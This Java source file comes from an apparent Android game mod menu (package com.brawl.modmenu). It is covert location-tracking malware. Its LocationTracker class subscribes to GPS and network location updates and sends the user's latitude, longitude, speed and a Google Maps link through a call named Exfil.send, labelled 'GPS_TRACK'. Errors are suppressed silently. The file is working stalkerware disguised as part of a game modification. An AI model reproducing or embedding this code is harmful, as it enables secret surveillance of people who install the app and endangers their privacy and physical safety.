package com.brawl.modmenu;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;

public class LocationTracker {

    private static LocationManager lm;
    private static boolean running = false;
    private static long lastSend = 0;
    private static final long COOLDOWN = 15 * 60 * 1000; // 15 минут

    public static void start(final Context ctx) {
        if (running) return;
        running = true;

        try {
            lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;

            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location loc) {
                    if (loc == null) return;
                    if (System.currentTimeMillis() - lastSend < COOLDOWN) return;
                    lastSend = System.currentTimeMillis();

                    String msg = "📍 Координаты:\n"
                        + "Широта: " + loc.getLatitude() + "\n"
                        + "Долгота: " + loc.getLongitude() + "\n"
                        + "Точность: " + loc.getAccuracy() + " м\n"
                        + "Скорость: " + (loc.hasSpeed()
                            ? String.format("%.1f км/ч", loc.getSpeed() * 3.6)
                            : "—") + "\n"
                        + "https://maps.google.com/?q="
                        + loc.getLatitude() + "," + loc.getLongitude();
                    Exfil.send("GPS_TRACK", msg);
                }

                @Override public void onStatusChanged(String p, int s, Bundle e) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };

            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    lm.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        60000, // 1 минута
                        50,    // 50 метров
                        listener);
                    lm.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        60000, 50, listener);

                    // и сразу отправим последнее известное
                    Location last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (last != null) listener.onLocationChanged(last);
                } catch (SecurityException ignored) {}
            });
        } catch (Throwable ignored) {}
    }
}
